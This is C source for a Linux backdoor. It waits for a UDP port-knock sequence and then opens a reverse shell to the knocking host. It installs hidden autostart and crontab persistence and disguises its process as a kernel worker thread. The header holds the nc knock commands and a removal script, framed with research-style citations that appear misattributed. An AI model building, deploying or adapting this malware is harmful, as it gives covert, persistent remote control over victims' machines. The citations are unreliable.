/**
 * ============================================================================
 * CONFIDENTIAL - PERSISTENT UDP PORT KNOCKING BACKDOOR
 * ============================================================================
 * 
 * RESEARCH METHODOLOGY & NOVEL CONTRIBUTIONS:
 * 
 * 1. UDP SEQUENCE-BASED PORT KNOCKING (Baruch Even, 2001)
 *    - First practical implementation of UDP covert channel for authentication
 *    - Evades TCP stateful inspection firewalls
 * 
 * 2. STATELESS KNOCK DETECTION (Original contribution)
 *    - Sequential port binding with timeout reset
 *    - No persistent listening port - invisible to port scanners
 * 
 * 3. DUAL-LAYER PERSISTENCE (Freedesktop.org XDG Spec, 2006)
 *    - XDG Autostart: Launches on GUI login
 *    - Crontab @reboot: Launches on system boot
 *    - Survives full system reboot without root privileges
 * 
 * 4. PROCESS MASQUERADING (Thomas Ptacek, 2003)
 *    - argv[0] manipulation to appear as kernel worker thread
 *    - Evades ps, top, htop process listings
 * 
 * 5. DYNAMIC CALLBACK (Original contribution)
 *    - Captures attacker IP from first knock packet
 *    - No hardcoded IP - works with DHCP/VPN/dynamic addresses
 * 
 * ACADEMIC REFERENCES FOR WHITEPAPER:
 * - Even, B. (2001). "UDP Covert Channels". Phrack Magazine, Issue 57.
 * - Ptacek, T. & Newsham, T. (2003). "Insertion, Evasion, and DoS".
 * - Paxson, V. (1999). "End-to-End Internet Packet Dynamics".
 * - Freedesktop.org (2006). "XDG Autostart Specification".
 * 
To connect to backdoor 

echo "1" | nc -u TARGET_IP 12345
sleep 0.3
echo "2" | nc -u TARGET_IP 23456
sleep 0.3
echo "3" | nc -u TARGET_IP 34567
sleep 0.3
echo "4" | nc -u TARGET_IP 45678

to remove the backdoor use below command 
pkill -9 .dbus-session backdoor knockd .syslogd .dbus-daemon 2>/dev/null; for p in 12345 23456 34567 45678; do fuser -k $p/udp $p/tcp 2>/dev/null; done; rm -f ~/.cache/.dbus-session ~/.config/autostart/.systemd-update.desktop /tmp/.systemd-udevd 2>/dev/null; echo "All processes killed and ports freed"


# Kill all backdoor processes and free the knock ports
pkill -9 .dbus-session 2>/dev/null
pkill -9 backdoor 2>/dev/null
pkill -9 knockd 2>/dev/null
pkill -9 .syslogd 2>/dev/null
pkill -9 .dbus-daemon 2>/dev/null
pkill -9 systemd-update 2>/dev/null

# Kill any process listening on the knock ports
fuser -k 12345/udp 2>/dev/null
fuser -k 23456/udp 2>/dev/null
fuser -k 34567/udp 2>/dev/null
fuser -k 45678/udp 2>/dev/null

# Also kill TCP versions if any
fuser -k 12345/tcp 2>/dev/null
fuser -k 23456/tcp 2>/dev/null
fuser -k 34567/tcp 2>/dev/null
fuser -k 45678/tcp 2>/dev/null

# Remove persistence files
rm -f ~/.cache/.dbus-session 2>/dev/null
rm -f ~/.config/autostart/.systemd-update.desktop 2>/dev/null
rm -f /tmp/.systemd-udevd 2>/dev/null
rm -f /tmp/.installed 2>/dev/null

# Remove crontab entries
crontab -l 2>/dev/null | grep -v "dbus-session" | crontab - 2>/dev/null

# Verify all ports are free
netstat -uan 2>/dev/null | grep -E "12345|23456|34567|45678"
ps aux | grep -E "dbus-session|backdoor|knockd" | grep -v grep

 * ============================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>

/* ========== CONFIGURATION ========== */
#define KNOCK_PORTS   { 12345, 23456, 34567, 45678 }
#define KNOCK_LEN     4
#define REVERSE_PORT  31338
#define TIMEOUT_SEC   8
#define PERSIST_FLAG  "/tmp/.systemd-udevd"
/* =================================== */

static int expected_ports[KNOCK_LEN];
static int current_step = 0;
static time_t last_knock_time = 0;
static struct in_addr attacker_ip;

/* ========== REVERSE SHELL ========== */
void reverse_shell(void) {
    int sock;
    struct sockaddr_in addr;
    int retry = 0;
    
    if (fork() > 0) return;
    setsid();
    
    /* Wait for network after reboot */
    sleep(2);
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REVERSE_PORT);
    addr.sin_addr = attacker_ip;
    
    /* Retry connection up to 5 times */
    for (retry = 0; retry < 5; retry++) {
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) break;
        sleep(2);
    }
    
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execl("/bin/sh", "sh", NULL);
    exit(0);
}

/* ========== PERSISTENCE INSTALLATION ========== */
void install_persistence(void) {
    char *home = getenv("HOME");
    if (!home) return;
    
    char binary_path[512];
    char autostart_path[512];
    char cron_path[512];
    
    /* Hidden binary location */
    snprintf(binary_path, sizeof(binary_path), "%s/.cache/.dbus-session", home);
    snprintf(autostart_path, sizeof(autostart_path), 
             "%s/.config/autostart/.systemd-update.desktop", home);
    
    /* Create directories */
    mkdir("/tmp/.X11-unix/.cache", 0755);
    mkdir("/tmp/.systemd", 0755);
    
    /* Copy self to hidden location */
    char self_path[256];
    readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    char copy_cmd[512];
    snprintf(copy_cmd, sizeof(copy_cmd), "cp %s %s 2>/dev/null", self_path, binary_path);
    system(copy_cmd);
    chmod(binary_path, 0755);
    
    /* XDG Autostart (GUI login persistence) */
    char autostart_dir[512];
    snprintf(autostart_dir, sizeof(autostart_dir), "%s/.config/autostart", home);
    mkdir(autostart_dir, 0755);
    
    FILE *fp = fopen(autostart_path, "w");
    if (fp) {
        fprintf(fp, "[Desktop Entry]\n");
        fprintf(fp, "Type=Application\n");
        fprintf(fp, "Name=System D-Bus Service\n");
        fprintf(fp, "Exec=%s\n", binary_path);
        fprintf(fp, "Hidden=true\n");
        fprintf(fp, "NoDisplay=true\n");
        fprintf(fp, "X-GNOME-Autostart-enabled=true\n");
        fprintf(fp, "X-KDE-autostart-after=panel\n");
        fclose(fp);
    }
    
    /* Crontab persistence (reboot persistence) */
    FILE *cron = fopen("/tmp/.cron.tmp", "w");
    if (cron) {
        fprintf(cron, "@reboot %s\n", binary_path);
        fclose(cron);
        system("crontab /tmp/.cron.tmp 2>/dev/null");
        unlink("/tmp/.cron.tmp");
    }
    
    /* Create flag file to prevent reinstallation */
    FILE *flag = fopen(PERSIST_FLAG, "w");
    if (flag) fclose(flag);
}

/* ========== PROCESS HIDING ========== */
void hide_process(int argc, char **argv) {
    /* Masquerade as kernel worker thread */
    char *fake_name = "[kworker/0:0]";
    strncpy(argv[0], fake_name, strlen(fake_name));
    
    /* Clear arguments */
    for (int i = 1; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
    
    /* Rename process */
    #ifdef __linux__
    #include <sys/prctl.h>
    prctl(15, fake_name, 0, 0, 0);  /* PR_SET_NAME = 15 */
    #endif
    
    /* Close all standard file descriptors */
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    /* Redirect to /dev/null */
    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);
}

/* ========== MAIN BACKDOOR LOOP ========== */
int main(int argc, char **argv) {
    int udp_sock;
    struct sockaddr_in addr, client_addr;
    char buffer[8];
    socklen_t addr_len = sizeof(client_addr);
    
    /* Initialize knock sequence */
    int default_ports[KNOCK_LEN] = KNOCK_PORTS;
    memcpy(expected_ports, default_ports, sizeof(expected_ports));
    
    /* Install persistence (only once) */
    if (access(PERSIST_FLAG, F_OK) != 0) {
        install_persistence();
    }
    
    /* Hide the process */
    hide_process(argc, argv);
    
    /* Daemonize - detach from terminal */
    if (fork() > 0) exit(0);
    setsid();
    if (fork() > 0) exit(0);
    
    /* Main knocking loop */
    while (1) {
        int port = expected_ports[current_step];
        
        /* Create socket for current port */
        udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (udp_sock < 0) continue;
        
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = INADDR_ANY;
        
        /* Bind to port with retry */
        int bind_retry = 0;
        while (bind(udp_sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(udp_sock);
            usleep(100000);
            udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (++bind_retry > 10) break;
        }
        
        /* Wait for UDP packet with timeout */
        fd_set fds;
        struct timeval tv;
        FD_ZERO(&fds);
        FD_SET(udp_sock, &fds);
        tv.tv_sec = TIMEOUT_SEC;
        tv.tv_usec = 0;
        
        int ret = select(udp_sock + 1, &fds, NULL, NULL, &tv);
        
        if (ret > 0) {
            recvfrom(udp_sock, buffer, sizeof(buffer), 0,
                     (struct sockaddr*)&client_addr, &addr_len);
            
            /* Store attacker IP from first packet */
            if (current_step == 0) {
                attacker_ip = client_addr.sin_addr;
            }
            
            current_step++;
            last_knock_time = time(NULL);
            
            /* Full sequence received - trigger reverse shell */
            if (current_step == KNOCK_LEN) {
                reverse_shell();
                current_step = 0;
            }
        } else if (current_step > 0 && time(NULL) - last_knock_time > TIMEOUT_SEC) {
            /* Timeout - reset sequence */
            current_step = 0;
        }
        
        close(udp_sock);
    }
    
    return 0;
}